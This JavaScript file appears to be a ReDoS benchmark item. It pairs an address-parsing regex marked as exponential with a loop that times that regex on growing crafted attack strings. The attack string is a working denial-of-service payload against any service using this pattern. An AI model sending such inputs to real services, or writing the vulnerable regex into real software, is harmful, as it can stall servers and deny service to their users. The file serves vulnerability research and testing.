/* 264
 * ((^[0-9]*).?((BIS)|(TER)|(QUATER))?)?((\W+)|(^))(([a-z]+.)*)([0-9]{5})?.(([a-z\'']+.)*)$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"'"+"a"*32+"!1 __EOA(iv)"
 */
var REGEX = /((^[0-9]*).?((BIS)|(TER)|(QUATER))?)?((\W+)|(^))(([a-z]+.)*)([0-9]{5})?.(([a-z\'']+.)*)$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '\'' + 'a'.repeat(i*1) + '!1 __EOA(iv)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}